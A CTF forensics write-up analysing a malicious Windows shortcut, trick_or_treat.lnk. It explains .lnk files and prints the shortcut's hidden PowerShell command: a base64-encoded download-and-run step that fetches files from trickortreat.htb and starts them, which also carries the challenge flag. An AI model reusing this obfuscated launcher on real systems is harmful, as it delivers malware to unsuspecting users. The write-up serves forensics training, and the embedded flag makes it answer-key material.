---
title: The Shortcut Haunting
tags:
  - CTF
  - HackTheBox
  - Forensics
---
Once we download the files, inside is contained a `.lnk` file called `trick_or_treat.lnk`.

A `.lnk` file is a Windows shortcut, also known as a link or alias, that points to and opens another file, folder, or application. It contains metadata about the target object, including its type, location, and filename.

**Key characteristics:**

- A `.lnk` file is a separate entity from the actual file or folder it references.
- When double-clicked, it opens the target file or folder, rather than displaying its contents.
- `.lnk` files can be created by right-clicking on an object and selecting “Create shortcut”.
- They are used to provide a convenient way to access frequently used files or applications.

So we can try to find something inside with **strings** command:

```shell
strings -e=l trick_or_treat.lnk

Windows
System32
WindowsPowerShell
v1.0
powershell.exe
Trick or treat?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-WindowStyle hidden -NoExit -Command "$fko = 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=';$dwQWf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));Invoke-Expression -Command $dwQWf"9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
C:\Windows\System32\shell32.dll
%SystemRoot%\System32\shell32.dll
S-1-5-21-3849600975-1564034632-632203374-1001
```

The malicious file employs PowerShell to execute commands within the system.

- `WindowStyle hidden`: Runs the PowerShell window in hidden mode, meaning the user won't see a command prompt or PowerShell window pop up.
- `NoExit`: This prevents the PowerShell window from closing immediately after executing the command, which is helpful for ongoing processes but won't be visible in this case due to -WindowStyle hidden.
- `Command`: This specifies the PowerShell command to be executed.
- `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fko));`: This line decodes the Base64 string into human-readable text. When decoded, the string reveals a PowerShell command.

So we can decode it from base64:

```shell
echo 'aXdyIC1VcmkgaHR0cHM6Ly90cmlja29ydHJlYXQuaHRiL2Jvby5wZGYgLU91dEZpbGUgJGVudjpURU1QXCBEcm9wYm94IGJvby5wZGY7JGZsYWc9J0hUQnt0cjFja18wcl90cjM0dF9nMDNzX3dyMG5nfSc7U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcIERyb3Bib3ggYm9vLnBkZjtTdGFydC1TbGVlcCAtcyA1O2l3ciAtVXJpIGh0dHBzOi8vdHJpY2tvcnRyZWF0Lmh0Yi9jYW5keS5qcyAtT3V0RmlsZSAkZW52OlRFTVBcY2FjbmR5LmpzO1N0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGNhbmR5LmpzO0V4aXQ=' | base64 -d
```

![](Pasted%20image%2020241023221617.png)
